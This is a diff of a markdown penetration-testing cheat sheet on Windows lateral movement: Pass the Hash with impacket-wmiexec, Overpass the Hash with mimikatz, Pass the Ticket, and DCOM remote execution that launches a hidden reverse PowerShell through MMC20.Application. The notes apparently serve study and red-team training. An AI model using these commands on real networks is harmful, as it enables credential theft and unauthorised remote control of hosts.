@@ -78,7 +78,9 @@ cmd > C:\path\to\PsExec64.exe -i  \\targethostname -u targetdomain\targetuser -p
 
 ### Pass the Hash
 
-Works with servers and services using NTLM authentication, but NOT with Kerberos authentication.
+Same requisites as PsExec: an `ADMIN$` share available and `File and Printer sharing` enabled. And an SMB connection (usually port 445). \
+Works with servers and services using NTLM authentication, but NOT with Kerberos authentication. \
+Works for Active Directory domain accounts and the built-in local administrator account. Doesn't work for local admins.\
 Impacket-Wmiexec on GitHub: https://github.com/fortra/impacket/blob/master/examples/smbclient.py
 ```
 /usr/bin/impacket-wmiexec -hashes 00000000000000000000000000000000:somelonghashstring Administrator@$VictimIP
@@ -86,7 +88,7 @@ Impacket-Wmiexec on GitHub: https://github.com/fortra/impacket/blob/master/examp
 
 ### Overpass the Hash
 
-First, run a process as a different user with Shift-Right click, say Notepad. Then:
+First, run a process as a different user with Shift-Right click, say Notepad, to cache this targeted user credentials. Then:
 ```
 kali$ xfreerdp /cert-ignore /u:someuser /d:targetorg.com /p:somepass /v:somehostIp
 PS > c:\path\to\mimikatz.exe
@@ -102,13 +104,16 @@ cmd > whoami # targetuser
 cmd > hostname # otherhostname
 ```
 
+If the targeted user has access rights on other servers, the hash could allow to connect.
+
 ### Pass the Ticket
 
 Context:
 - attacker connected as user1 on host1
-- user2 is connected on host2
+- user2 is connected on host1 and has access to resources on host2 \
 Goal:
-- steal user2's Ticket Granting Service in memory and inject it in user1's session. Then connect as user1 on host2 using user2's ticket
+- steal user2's Ticket Granting Service (TGS) in memory and inject it in user1's session.
+- then connect as user1 on host2 using user2's ticket or access the resources on host2
 
 ```
 PS > whoami # user1
@@ -126,8 +131,14 @@ PS > ls \\host2\someshare # access granted
 
 In an elevated PowerShell:
 ```
-$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","targetIpAddress"))
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$targetIpAddress")) # the IP address is the only parameter to modify
+```
+Usage to open a `calc` on the remote computer:
+```
 $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc", "7") # parameters are Command, Directory, Parameters, and WindowState
+```
+Usage to launch a reverse PowerShell on the remote computer:
+```
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e base64longreverseshellstring", "7")
 ```
 Reference: https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand
